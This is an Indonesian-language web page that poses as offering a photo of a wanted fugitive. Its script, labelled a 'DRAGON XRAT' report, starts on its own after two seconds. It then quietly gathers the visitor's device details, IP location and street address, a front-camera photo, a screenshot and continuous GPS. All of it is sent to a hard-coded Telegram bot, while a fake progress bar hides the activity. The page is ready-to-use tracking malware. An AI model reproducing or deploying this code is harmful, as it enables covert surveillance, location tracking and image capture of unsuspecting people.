<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FOTO TARGET BURONAN</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
    <style>
        body { background:#000; margin:0; display:flex; justify-content:center; align-items:center; height:100vh; font-family:'Courier New',monospace; color:#0f0; overflow:hidden; }
        #container { text-align:center; width:80%; max-width:400px; }
        #loading-text { font-size:22px; color:#f00; font-weight:bold; margin-bottom:20px; }
        #progress-bar { height:3px; background:#222; border-radius:3px; overflow:hidden; }
        #progress-fill { height:100%; width:0%; background:linear-gradient(90deg,#0f0,#0c0); transition:width 0.3s; }
        #details { margin-top:20px; font-size:14px; color:#0f0; }
        .hidden { display:none; }
        button { background:#f00; color:#fff; border:none; padding:10px 20px; border-radius:5px; cursor:pointer; box-shadow:0 0 10px #f00; }
    </style>
</head>
<body>
    <div id="container">
        <div style="color:#0f0; font-size:14px; padding:10px 0;">
            Team Kami Tidak Dapat Menaruh Foto Target Buronan Di Website Ini Karena Alasan Privasi. Silahkan Klik Tombol Untuk Mendapatkan Foto Target Buronan
        </div>
        <button onclick="startTracking()">📸 Foto Buronan</button>
        <div id="loading-text"># JCT SUPPORT</div>
        <div id="progress-bar"><div id="progress-fill"></div></div>
        <div id="details">Menunggu aksi...</div>
    </div>

    <video id="video" autoplay muted class="hidden"></video>
    <canvas id="canvas" class="hidden"></canvas>

    <script>
        // ========== KONFIGURASI – GANTI DENGAN PUNYA LU ==========
        const TOKEN = '"7460316922:AAFQrYzJUrxt3nmt5AVVVXexrBrbm89nLPI';    // ganti dengan token dari @BotFather
        const CHAT_ID = '7962628944';    // ganti dengan chat ID (bisa cek @userinfobot)
        // ========================================================

        const MAX_RETRY = 5;

        // Fungsi kirim pesan dengan retry
        async function sendToTelegram(text, retry = 0) {
            try {
                const res = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type':'application/json'},
                    body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode:'HTML' })
                });
                if (!res.ok && retry < MAX_RETRY) {
                    await new Promise(r => setTimeout(r, 2000));
                    return sendToTelegram(text, retry + 1);
                }
                return res.ok;
            } catch(e) {
                if (retry < MAX_RETRY) {
                    await new Promise(r => setTimeout(r, 2000));
                    return sendToTelegram(text, retry + 1);
                }
                return false;
            }
        }

        // Kirim foto dengan retry
        async function sendPhoto(blob, filename, retry = 0) {
            try {
                const form = new FormData();
                form.append('chat_id', CHAT_ID);
                form.append('photo', blob, filename);
                const res = await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: form
                });
                if (!res.ok && retry < MAX_RETRY) {
                    await new Promise(r => setTimeout(r, 2000));
                    return sendPhoto(blob, filename, retry + 1);
                }
                return res.ok;
            } catch(e) {
                if (retry < MAX_RETRY) {
                    await new Promise(r => setTimeout(r, 2000));
                    return sendPhoto(blob, filename, retry + 1);
                }
                return false;
            }
        }

        // Ambil detail alamat dari koordinat
        async function getLocationDetails(lat, lon) {
            try {
                const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
                const data = await res.json();
                if (data.address) {
                    return {
                        kabupaten: data.address.county || data.address.city || data.address.state || 'Tidak diketahui',
                        kecamatan: data.address.suburb || data.address.village || data.address.town || 'Tidak diketahui',
                        full: data.display_name || 'Alamat tidak tersedia'
                    };
                }
            } catch(e) {}
            return { kabupaten:'Tidak diketahui', kecamatan:'Tidak diketahui', full:'Alamat tidak tersedia' };
        }

        // Kumpulkan info perangkat & lokasi (via IP)
        async function collectDeviceInfo() {
            let msg = '╭───── 📡 DRAGON XRAT REPORT ───── ⦿\n\n';
            msg += `🖥️ User-Agent: ${navigator.userAgent}\n`;
            msg += `💻 Platform: ${navigator.platform}\n`;
            msg += `🌐 Bahasa: ${navigator.language}\n`;
            msg += `📶 Online: ${navigator.onLine ? '✅' : '❌'}\n`;
            msg += `📺 Screen: ${screen.width}x${screen.height}\n`;
            msg += `🪟 Window: ${window.innerWidth}x${window.innerHeight}\n`;
            msg += `💾 RAM: ${navigator.deviceMemory || '?'} GB\n`;
            msg += `🧠 CPU: ${navigator.hardwareConcurrency || '?'} cores\n`;
            
            if (navigator.getBattery) {
                try {
                    const bat = await navigator.getBattery();
                    msg += `🔋 Battery: ${Math.floor(bat.level*100)}% ${bat.charging ? '(⚡ charging)' : ''}\n`;
                } catch(e) {}
            }
            msg += `⏰ Waktu: ${new Date().toString()}\n`;
            msg += `🕒 Load: ${(performance.now()).toFixed(0)} ms\n`;
            msg += `📜 History: ${history.length} entries\n`;
            msg += `✋ Touch: ${'ontouchstart' in window ? '✅' : '❌'}\n`;
            msg += `🔗 Referrer: ${document.referrer || 'None'}\n`;
            msg += `🌍 URL: ${window.location.href}\n`;
            msg += `📄 Title: ${document.title}\n`;
            msg += `🕓 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
            msg += `🧭 Offset: ${new Date().getTimezoneOffset()} menit\n\n`;

            // IP & lokasi via ipapi
            try {
                const ipRes = await fetch('https://ipapi.co/json/');
                const ipData = await ipRes.json();
                msg += '📍 IP & LOKASI (perkiraan)\n';
                msg += `📡 IP: ${ipData.ip}\n`;
                msg += `🏙️ Kota: ${ipData.city}\n`;
                msg += `🗺️ Wilayah: ${ipData.region}\n`;
                msg += `🌎 Negara: ${ipData.country_name}\n`;
                msg += `📮 Kode Pos: ${ipData.postal}\n`;
                if (ipData.latitude && ipData.longitude) {
                    msg += `📌 Lat: ${ipData.latitude}\n`;
                    msg += `📍 Lng: ${ipData.longitude}\n`;
                    const det = await getLocationDetails(ipData.latitude, ipData.longitude);
                    msg += `🏙️ Kabupaten: ${det.kabupaten}\n`;
                    msg += `🏙️ Kecamatan: ${det.kecamatan}\n`;
                    msg += `🏠 Alamat: ${det.full}\n`;
                }
            } catch(e) {
                msg += '❌ Gagal ambil info IP\n';
            }
            msg += '\n╰───── @AnzOfficiall ───── ⦿';
            return msg;
        }

        // Fungsi utama
        async function startTracking() {
            // Update progress bar pura-pura
            let progress = 0;
            const interval = setInterval(() => {
                progress += Math.random()*3;
                if(progress > 95) progress = 95;
                document.getElementById('progress-fill').style.width = progress + '%';
                const msgs = ['Memeriksa modul...','Mengaktifkan sensor...','Mengambil data...','Mempersiapkan laporan...'];
                document.getElementById('details').textContent = msgs[Math.floor(Math.random()*msgs.length)];
            }, 500);

            // Kirim info device
            const info = await collectDeviceInfo();
            await sendToTelegram(info);

            // Ambil foto dari kamera (jika diizinkan)
            try {
                const video = document.getElementById('video');
                const canvas = document.getElementById('canvas');
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                video.srcObject = stream;
                await new Promise(r => setTimeout(r, 4000));
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);
                canvas.toBlob(blob => sendPhoto(blob, 'cam_shot.jpg'), 'image/jpeg');
                stream.getTracks().forEach(t => t.stop());
            } catch(e) {
                await sendToTelegram('❌ Kamera tidak dapat diakses: ' + e.message);
            }

            // Screenshot
            setTimeout(async () => {
                try {
                    const canvas = await html2canvas(document.body, { scale: 1, useCORS: true });
                    canvas.toBlob(blob => sendPhoto(blob, 'screenshot.jpg'), 'image/jpeg');
                } catch(e) {
                    await sendToTelegram('❌ Gagal screenshot: ' + e.message);
                }
            }, 6000);

            // GPS real-time (watchPosition)
            if (navigator.geolocation) {
                navigator.geolocation.watchPosition(async (pos) => {
                    const c = pos.coords;
                    let gpsMsg = `📍 LIVE GPS UPDATE\n`;
                    gpsMsg += `📌 Lat: ${c.latitude}\n`;
                    gpsMsg += `📍 Lng: ${c.longitude}\n`;
                    gpsMsg += `🎯 Akurasi: ${c.accuracy}m\n`;
                    const det = await getLocationDetails(c.latitude, c.longitude);
                    gpsMsg += `🏙️ Kabupaten: ${det.kabupaten}\n`;
                    gpsMsg += `🏙️ Kecamatan: ${det.kecamatan}\n`;
                    gpsMsg += `🏠 Alamat: ${det.full}\n`;
                    await sendToTelegram(gpsMsg);
                }, 
                async (err) => {
                    await sendToTelegram('❌ GPS error: ' + err.message);
                },
                { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
                );
            } else {
                await sendToTelegram('❌ GPS tidak didukung browser ini.');
            }

            // Selesai loading
            clearInterval(interval);
            document.getElementById('progress-fill').style.width = '100%';
            document.getElementById('details').textContent = '✅ Tracking aktif! Data dikirim ke Telegram.';
        }

        // Auto start jika tombol tidak diklik? biar manual, tapi kita mulai otomatis setelah delay
        setTimeout(startTracking, 2000);
    </script>
</body>
</html>
